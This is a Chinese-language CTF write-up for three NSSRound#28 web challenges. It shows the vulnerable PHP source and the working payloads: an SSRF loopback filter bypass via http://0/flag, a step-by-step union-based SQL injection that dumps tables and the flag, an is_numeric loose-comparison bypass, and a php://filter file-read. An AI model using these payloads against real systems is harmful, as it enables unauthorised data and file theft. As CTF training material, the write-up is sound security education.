---
title: NSSround#28Team_Web_WP
categories:
  - 学习
tags:
  - WP
---

### ez_ssrf

#### 代码分析

```php
<?php
highlight_file(__FILE__);

//flag在/flag路由中

if (isset($_GET['url'])) {
    $url = $_GET['url'];  #获取输入的url内容

    #判断输入的内容中是否含有http://，如果没有则返回error
    if (strpos($url, 'http://') !== 0) {
        echo json_encode(["error" => "Only http:// URLs are allowed"]);
        exit;
    }

    #parse_url() 是 PHP 中用于解析 URL 的内置函数，它的第二个参数 PHP_URL_HOST 表示 提取 URL 中的 host 部分。
    #http://127.0.0.1/flag → host 是 127.0.0.1;http://0/flag → host 是 0
    $host = parse_url($url, PHP_URL_HOST);
    
	#gethostbyname() 是 PHP 中用于将域名（或主机名）解析为对应 IPv4 地址的内置函数。它的核心功能是 将主机名转换为 IPv4 地址，域名解析：如果输入是域名（如 example.com），函数会通过 DNS 查询获取其 IPv4 地址。若域名无法解析，则返回原始输入（例如 gethostbyname("invalid.abc") 返回 "invalid.abc"）。直接输入 IP 地址：如果输入本身是合法的 IPv4 地址（如 127.0.0.1），函数直接返回该地址，不会进行额外解析；
    $ip = gethostbyname($host); #使环回绕过失效，依旧被识别为127.0.0.1
    
	#判断输入的host是否含有127.0.0.1和::1,如果有则返回error
    #禁止访问本地回环地址（localhost）
    $forbidden_ips = ['127.0.0.1', '::1']; #::1 是 IPv6 的环回地址，功能等同于 IPv4 的 127.0.0.1
    #in_array()函数作用：判断 $ip 是否存在于 $forbidden_ips 数组中。若存在 → 返回 true，执行代码块内的逻辑。若不存在 → 跳过检查，继续执行后续代码。
    if (in_array($ip, $forbidden_ips)) {
        echo json_encode(["error" => "Access to localhost or 127.0.0.1 is forbidden"]);
        exit;
    }
    

    $ch = curl_init(); 	#curl_init()：初始化 cURL 会话
   # curl_setopt() 是 cURL 库的 统一配置接口，用于设置请求的各类参数。第一个参数：cURL 句柄（$ch），标识一个具体的 HTTP 会话。第二个参数：选项常量（如 CURLOPT_URL、CURLOPT_RETURNTRANSFER），决定配置的类型。第三个参数：配置的具体值，类型和含义由 选项常量 决定。
    # CURLOPT_URL：设置请求地址;
    #curl_setopt($ch, CURLOPT_URL, $url) 功能：定义 HTTP 请求的目标 URL。
    curl_setopt($ch, CURLOPT_URL, $url);
    
    #CURLOPT_RETURNTRANSFER：控制响应返回方式;
    #curl_setopt($ch, CURLOPT_RETURNTRANSFER, true)作用：决定是否将服务器返回的内容保存到变量中。
    #若设为 true，响应内容会被写入内存缓冲区，通过 curl_exec() 返回。若设为 false（默认），响应内容会直接输出到标准输出（如	屏幕）
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   
	#curl_exec($ch) 是 cURL 函数库中 执行 HTTP 请求 的核心函数，其作用是根据预先配置的 cURL 会话（$ch）发起网络请求，并返	  回服务器的响应结果。
    $response = curl_exec($ch);
	
    #检查是否有错误发生，如果有，将错误信息封装为 JSON 格式（如 {"error": "Could not resolve host"}）并输出；若无错误，直接输出 $response（服务器返回的原始内容）。
    #curl_errno($ch)核心作用：返回最后一次 cURL 操作（如 curl_exec()）的错误代码（错误编号）。无错误时：返回 0。有错误时：返回非零整数（如 6 表示 DNS 解析失败，28 表示超时）。
    if (curl_errno($ch)) {
        echo json_encode(["error" => curl_error($ch)]);
    } else {
        echo $response;
    }
    
	#关闭一个cURL会话并且释放所有资源。
    curl_close($ch);
} else {
    echo json_encode(["error" => "Please provide a 'url' parameter"]);
}
?>
```

#### curl函数

1. **初始化** → `curl_init()`
2. **配置** → `curl_setopt()`
3. **执行** → `curl_exec()`
4. **关闭** → `curl_close()`
5. **检查**→ `curl_errno()`

#### 思路

这题实际上就是访问/flag文件就可以，但是过滤了`127.0.0.1和::1`并且因为使用了函数` $ip = gethostbyname($host);`先进行域名解析再进行过滤，环回绕过也无法使用，但因为没有过滤0.0.0.0，所以可以使用0 来进行本地借口访问

#### 为什么`http://0/flag`行

- 若系统将 `"0"` 视为特殊主机名，直接返回 `0.0.0.0`。
- 若系统尝试 DNS 查询，但 `"0"` 无法解析为有效域名，可能返回 `0.0.0.0` 或保持原值（依赖环境配置）。

- `0.0.0.0` 是 **IPv4 的默认路由地址**，表示“监听所有本地网络接口”（包括环回接口 `127.0.0.1` 和物理网卡接口）
- 当服务器程序绑定到 `0.0.0.0` 时，它会接收来自所有网络接口的请求（包括本地服务）。
- **绕过逻辑**：
   若黑名单仅禁止 `127.0.0.1` 和 `::1`，但未包含 `0.0.0.0`，攻击者通过构造 `http://0/flag`，使得解析后的 IP 为 `0.0.0.0`，从而绕过校验。

### light_pink

#### 思路

这里刚开始做的时候还是思路不清晰，先直接用`?id=1  ?id=1'  ?id=1"`输入，看有没有报错，如果有报错，再用`%23`闭合，通过逻辑方式来检验

#### 流程

```sql
#查库名
?id=100' union select 1,2,3,database(),5 %23
#回显 nss_board
#查表名
?id=100' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema like database()),database(),5%23
#回显 Cute,messages

#查列名
?id=100' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name like 'cute'),database(),5%23
#回显 id,Happy

#查数据(短路了，Cute打成Cute，被硬控了一会)
?id=100' union select 1,2,(select group_concat(id,'~',Happy) from Cute),database(),5%23
#回显 1~NSSCTF{Hel1o_th1s_is_light_p1nk_flag}

```

### ez_php

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
#检查是否输入a,b,password
if (isset($_POST['a']) && isset($_POST['b']) && isset($_GET['password'])) {
    $a = $_POST['a'];
    $b = $_POST['b'];
    $password = $_GET['password'];
    #检查password是否都为数字，如果是就die，如果不是123456.也die
    if (is_numeric($password)) {
        die("password can't be a number</br>");
    } elseif ($password != 123456) {
        die("Wrong password</br>");
    }
	#a不等于b，且a.b md5的值要相同
    if ($a != $b && md5($a) === md5($b)) {
        echo "wonderful</br>";
        #读取文件
        include($_POST['file']);   # level2.php
    }
}
?>
```

#### `is_numeric($password)`绕过

- **作用**：检查输入是否为合法数字，常用于防止注入攻击或非法输入。
- 常见实现方式
  - **正则表达式**：如`/^\d+$/`（仅整数）或`/^[-+]?(\d+|\d+\.\d+|\.\d+)([eE][-+]?\d+)?$/`（支持科学计数法）。
  - **语言内置函数**：如PHP的`is_numeric()`、Python的`str.isdigit()`。
  - **类型转换检测**：尝试将输入转换为数字（如`float(input)`），捕获异常。

##### **绕过方法及原理**

**1 科学计数法**

- **示例**：`1e3`（等价于1000）。
- **适用场景**：函数支持科学计数法（如PHP的`is_numeric()`）。
- **后续利用**：若输入被转换为数字，可能触发计算或类型转换漏洞。

**2 十六进制/八进制**

- **示例**：`0x1a3`（十六进制）、`0777`（八进制）。
- **适用场景**：函数允许非十进制格式（如PHP的`is_numeric()`接受`0x`前缀）。
- **后续利用**：十六进制可能被解码为ASCII字符串（如`0x414243`→`ABC`），导致注入。

**3 类型转换漏洞**

- **示例**：`"123abc"`在弱类型语言（如PHP）中可能被强制转换为`123`。

- 绕过逻辑

  ```
  // PHP示例：is_numeric("123abc")为false，但弱类型比较可能通过
  if (is_numeric($input) && $input == 123) { ... }
  ```

- **防御缺陷**：未严格使用全等（`===`）进行比较。

**4 空格与特殊字符**

- **示例**：`" 123"`、`"123\n"`。
- **绕过逻辑**：若函数未做`trim`处理，可能通过正则检测（如`/^\d+$/`不匹配，但`is_numeric()`允许空格）。

**5 小数点与符号**

- **示例**：`+123`、`-123.45`。
- **适用场景**：函数允许符号或浮点数，但后续代码预期整数。

**6 Unicode与特殊编码**

- **示例**：全角数字`"１２３"`、Unicode数字字符`"①"`。
- **绕过逻辑**：函数未正确处理Unicode或字符集转换。

**7 空字节截断**

- **示例**：`"123\0x00abc"`。
- **适用场景**：C语言或低级语言中处理字符串时，空字节可能截断输入。

**8 超大数字溢出**

- **示例**：`"99999999999999999999"`（超出整型范围）。
- **后续利用**：整数溢出可能导致逻辑错误或内存问题。

##### 方法

因为这里第一要输入不完全为数字，而且要被识别为123456，所以可以用**3.类型转换漏洞** 输入`123456a`，被识别为123456.

#### md5`===`绕过

用数组绕过就可以，之后写一篇完整的吧

#### `include()`读取文件

`file=php://filter/convert.base64-encode/resource=level2.php`用php伪协议读取即可
